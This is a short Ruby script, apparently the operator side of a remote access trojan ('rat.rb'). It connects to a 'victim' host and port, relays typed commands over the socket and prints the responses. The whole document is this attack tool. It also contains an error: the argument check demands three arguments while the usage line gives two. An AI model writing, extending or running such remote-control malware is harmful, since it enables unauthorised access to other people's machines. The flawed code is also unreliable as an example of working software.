require 'socket'

def connect_to_victim(host, port)
  s = TCPSocket.open(host, port)
  return s
end

def execute_command(s, command)
  s.print command
  response = s.gets.chomp
  return response
end

def main
  if ARGV.length < 3
    puts "Usage: ruby rat.rb <host> <port>"
    exit 1
  end

  host = ARGV[0]
  port = ARGV[1].to_i

  victim_socket = connect_to_victim(host, port)

  while true
    command = gets.chomp
    response = execute_command(victim_socket, command)
    puts response
  end
end

main
